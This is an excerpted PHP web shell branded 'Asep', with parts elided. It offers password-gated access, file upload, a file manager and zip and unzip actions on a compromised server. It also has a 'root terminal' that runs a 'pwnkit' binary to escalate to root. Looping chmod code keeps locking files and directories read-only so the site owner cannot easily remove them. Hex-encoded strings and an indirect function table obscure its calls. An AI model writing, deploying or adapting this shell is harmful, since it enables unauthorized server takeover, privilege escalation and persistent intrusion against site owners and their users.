...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$12$bK5fJmlxn1Ldqnb8G4uyNeFl5scFzY7rHDmz0n/gXQdHhP.mGa7RG'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
...
<head>
    ...
    <title>Asep [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-Asep"><img width="400" height="400" src="//raw.githubusercontent.com/nanzy-co/shell/refs/heads/main/1001627945.jpg" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="Asep-up-submit" class="btn-submit">&nbsp;<input type="file" name="Asep-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="Asep-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="Asep-select" class="btn-submit">
        ...
        <!-- Modal Pop Jquery Create Folder/File By ./Macibai1227 -->
        <div class="modal">
    ...
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                ...
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.Macibai-root') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.Macibai-root');
...
while (True){
    ...
    if (Asep_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (Asep_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function Asep_perm($flename){
...
if (isset($_POST['Asep-up-submit'])) {
    $namaFilenya = $_FILES['Asep-upload']['name'];
    $tmpName = $_FILES['Asep-upload']['tmp_name'];
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        ...
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .Macibai-root');
...
if (isset($_POST['submit-action'])) {
    ...
    } else if ($_POST['Asep-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
...
while (True){
    ...
    if (Asep_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (Asep_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
